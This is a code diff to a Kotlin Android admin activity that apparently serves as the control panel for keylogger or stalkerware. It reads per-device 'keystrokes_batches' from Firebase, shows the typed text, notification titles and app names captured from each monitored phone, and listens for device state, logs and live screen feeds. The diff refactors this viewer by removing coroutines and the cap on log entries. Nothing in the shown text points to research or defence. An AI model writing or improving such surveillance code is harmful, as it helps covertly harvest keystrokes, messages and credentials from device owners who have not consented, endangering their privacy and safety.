@@ -16,10 +16,6 @@ import com.google.firebase.database.DataSnapshot
 import com.google.firebase.database.DatabaseError
 import com.google.firebase.database.FirebaseDatabase
 import com.google.firebase.database.ValueEventListener
-import kotlinx.coroutines.CoroutineScope
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.launch
-import kotlinx.coroutines.withContext
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
@@ -83,37 +79,28 @@ class AdminMainActivity : AppCompatActivity() {
         val dbRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
         dbRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
-                CoroutineScope(Dispatchers.IO).launch {
-                    val newDevices = mutableListOf<DeviceModel>()
-                    var totalEvents = 0
+                var totalEvents = 0
 
-                    for (child in snapshot.children) {
-                        val deviceName = child.key ?: continue
-                        var device = deviceList.find { it.name == deviceName }
-                        if (device == null) {
-                            device = DeviceModel(deviceName)
-                            withContext(Dispatchers.Main) {
-                                deviceList.add(device)
-                                listenToDeviceState(deviceName)
-                                listenToDeviceLogs(deviceName)
-                                listenToLiveScreen(deviceName)
-                            }
-                        }
-                        for (appChild in child.children) {
-                            if (appChild.key == "live_screen") continue
-                            for (entry in appChild.children) {
-                                totalEvents++
-                            }
-                        }
-                        newDevices.add(device)
+                for (child in snapshot.children) {
+                    val deviceName = child.key ?: continue
+                    if (deviceList.none { it.name == deviceName }) {
+                        val device = DeviceModel(deviceName)
+                        deviceList.add(device)
+                        listenToDeviceState(deviceName)
+                        listenToDeviceLogs(deviceName)
+                        listenToLiveScreen(deviceName)
                     }
-
-                    withContext(Dispatchers.Main) {
-                        txtTotalDevices.text = deviceList.size.toString()
-                        txtTotalEvents.text = totalEvents.toString()
-                        adapter.notifyDataSetChanged()
+                    for (appChild in child.children) {
+                        if (appChild.key == "live_screen") continue
+                        for (entry in appChild.children) {
+                            totalEvents++
+                        }
                     }
                 }
+
+                txtTotalDevices.text = deviceList.size.toString()
+                txtTotalEvents.text = totalEvents.toString()
+                adapter.notifyDataSetChanged()
             }
 
             override fun onCancelled(error: DatabaseError) {}
@@ -209,45 +196,41 @@ class AdminMainActivity : AppCompatActivity() {
         val logRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches").child(deviceName)
         logRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
-                CoroutineScope(Dispatchers.IO).launch {
-                    val entries = mutableListOf<Triple<Long, String, String>>()
-                    val dateTimeFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
+                val entries = mutableListOf<Triple<Long, String, String>>()
+                val dateTimeFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
 
-                    for (appChild in snapshot.children) {
-                        val rawApp = appChild.key ?: continue
-                        if (rawApp.startsWith("notification_", true)) continue
-                        if (rawApp == "live_screen") continue
-                        val prettyApp = getPrettyAppName(rawApp)
-                        for (entry in appChild.children) {
-                            val text = entry.child("text").getValue(String::class.java)
-                                ?: entry.child("title").getValue(String::class.java)
-                                ?: entry.child("typedContent").getValue(String::class.java)
-                                ?: continue
+                for (appChild in snapshot.children) {
+                    val rawApp = appChild.key ?: continue
+                    if (rawApp.startsWith("notification_", true)) continue
+                    if (rawApp == "live_screen") continue
+                    val prettyApp = getPrettyAppName(rawApp)
+                    for (entry in appChild.children) {
+                        val text = entry.child("text").getValue(String::class.java)
+                            ?: entry.child("title").getValue(String::class.java)
+                            ?: entry.child("typedContent").getValue(String::class.java)
+                            ?: continue
 
-                            val timestampMillis = parseTimestamp(entry.child("timestamp").value) ?: System.currentTimeMillis()
+                        val timestampMillis = parseTimestamp(entry.child("timestamp").value) ?: System.currentTimeMillis()
 
-                            if (text.isNotBlank() && text != "null") {
-                                entries.add(Triple(timestampMillis, prettyApp, text))
-                            }
+                        if (text.isNotBlank() && text != "null") {
+                            entries.add(Triple(timestampMillis, prettyApp, text))
                         }
                     }
+                }
 
-                    // Sort newest on top (latest first)
-                    entries.sortByDescending { it.first }
+                // Sort newest on top
+                entries.sortByDescending { it.first }
 
-                    // Take latest 100 entries with exact Date & Time sync
-                    val cappedEntries = entries.take(100).joinToString("\n") { item ->
-                        val dateStr = dateTimeFormat.format(Date(item.first))
-                        "[$dateStr] [${item.second}] ${item.third}"
-                    }
+                val sb = StringBuilder()
+                for (item in entries) {
+                    val dateStr = dateTimeFormat.format(Date(item.first))
+                    sb.append("[$dateStr] [${item.second}] ${item.third}\n")
+                }
 
-                    withContext(Dispatchers.Main) {
-                        val index = deviceList.indexOfFirst { it.name == deviceName }
-                        if (index != -1) {
-                            deviceList[index].logFeed = if (cappedEntries.isNotBlank()) cappedEntries else "No telemetry recorded yet."
-                            adapter.notifyItemChanged(index)
-                        }
-                    }
+                val index = deviceList.indexOfFirst { it.name == deviceName }
+                if (index != -1) {
+                    deviceList[index].logFeed = if (sb.isNotEmpty()) sb.toString() else "No telemetry recorded yet."
+                    adapter.notifyItemChanged(index)
                 }
             }
 
